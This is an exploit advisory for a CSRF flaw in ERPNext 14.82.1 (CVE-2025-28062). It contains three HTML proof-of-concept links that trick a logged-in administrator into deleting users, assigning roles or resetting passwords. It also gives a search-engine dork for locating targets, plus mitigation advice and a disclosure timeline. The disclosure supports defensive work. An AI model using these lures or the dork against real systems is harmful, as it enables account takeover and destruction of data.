---
title: ERPNext 14.82.1 Account Takeover via Cross-Site Request Forgery (CSRF)
url: https://cxsecurity.com/issue/WLB-2025050016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-07
fetch_date: 2025-10-06T22:23:21.825396
---

# ERPNext 14.82.1 Account Takeover via Cross-Site Request Forgery (CSRF)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ERPNext 14.82.1 Account Takeover via Cross-Site Request Forgery (CSRF)** **2025.05.06**  Credit:  **[Ahmed Thaiban](https://cxsecurity.com/author/Ahmed%2BThaiban/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-28062](https://cxsecurity.com/cveshow/CVE-2025-28062/ "Click to see CVE-2025-28062")**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")**  **[**Dork:** inurl:"/api/method/frappe"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: ERPNext 14.82.1 - Account Takeover via Cross-Site Request Forgery (CSRF)
# Google Dork: inurl:"/api/method/frappe"
# Date: 2025-04-29
# Exploit Author: Ahmed Thaiban (Thvt0ne)
# Vendor Homepage: https://erpnext.com
# Software Link: https://github.com/frappe/erpnext
# Version: <= 14.82.1, 14.74.3 (Tested)
# Tested on: Linux (Ubuntu 20.04), Chrome, Firefox.
# CVE : CVE-2025-28062
# Category: WebApps
# Description:
A Cross-Site Request Forgery (CSRF) vulnerability Lead to Account Takeover exists in ERPNext 14.82.1 and 14.74.3. This flaw allows an attacker to perform unauthorized state-changing operations on behalf of a logged-in administrator without their knowledge or consent.
Affected endpoints include:
- /api/method/frappe.desk.reportview.delete\_items
- /api/method/frappe.desk.form.save.savedocs
Impact:
- Deletion of arbitrary users
- Unauthorized role assignment
- Account takeover via password change
The application fails to enforce CSRF tokens on administrative API requests, violating OWASP recommendations.
---
# PoC 1: Delete a User
<html>
<body>
<h2>Delete User</h2>
<a href="http://target/api/method/frappe.desk.reportview.delete\_items?items=%5B%221%401.com%22%5D&doctype=User">
Click Here
</a>
</body>
</html>
---
# PoC 2: Assign Role
<html>
<body>
<h2>Assign Role to User</h2>
<a href="http://target/api/method/frappe.desk.form.save.savedocs?doc=REDACTED\_JSON&action=Save">
Add Role
</a>
</body>
</html>
---
# PoC 3: Reset Password
<html>
<body>
<h2>Reset User Password</h2>
<a href="http://target/api/method/frappe.desk.form.save.savedocs?doc=REDACTED\_JSON&action=Save">
Reset Password
</a>
</body>
</html>
---
# Mitigation:
- Enforce CSRF protection for all administrative endpoints
- Require POST methods for state changes
- Mark cookies as SameSite=Strict
- Implement re-authentication for critical user changes
---
# Disclosure Timeline:
- 2025-02-09: Vulnerability discovered
- 2025-02-10: Reported to Frappe (no response)
- 2025-04-29: Public disclosure via CVE + advisory
---
# Author Contact:
LinkedIn: https://linkedin.com/in/ahmedth
GitHub: https://github.com/Thvt0ne
# References:
- https://owasp.org/www-community/attacks/csrf

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top